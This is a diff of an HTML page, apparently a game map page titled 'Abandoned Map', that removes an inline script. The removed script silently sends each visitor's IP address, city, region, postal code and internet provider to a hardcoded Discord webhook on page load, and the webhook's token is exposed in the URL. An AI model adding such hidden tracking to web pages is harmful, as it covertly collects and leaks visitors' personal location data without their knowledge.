@@ -711,59 +711,5 @@ function applyBlurEffect() {
 </div>
 <div id="blur-overlay1" class="blur-overlay"></div>
 
-<script>
-    fetch("https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-        content: "-----------------------------------------------------------------------------"
-      })
-    });
-    
-    fetch("https://api.ipify.org?format=json")
-      .then(response => response.json())
-      .then(data => {
-        fetch("https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_", {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json"
-          },
-          body: JSON.stringify({
-            content: "Page: Abandoned Map\nUser IP Address: " + data.ip
-          })
-        });
-    
-        fetch('https://ipinfo.io/json')
-          .then(response => response.json())
-          .then(data => {
-            fetch('https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({
-                content: `Geographical info: ${data.city}, ${data.region} (${data.postal})`
-              })
-            });
-          });
-    
-        fetch('https://ipapi.co/json')
-          .then(response => response.json())
-          .then(data => {
-            fetch('https://discord.com/api/webhooks/1070051902882066472/bekqeiGnkm4iUHAY5aBld_5LhC0pQQaQxW2DRbh9Ia1adUXr7h2DzzSE1Nx_bBaiBDe_', {
-              method: 'POST',
-              headers: {
-                'Content-Type': 'application/json'
-              },
-              body: JSON.stringify({
-                content: `Internet service provider: ${data.org}`
-              })
-            });
-          });
-      });
-    </script>
-
 </body>
 </html>
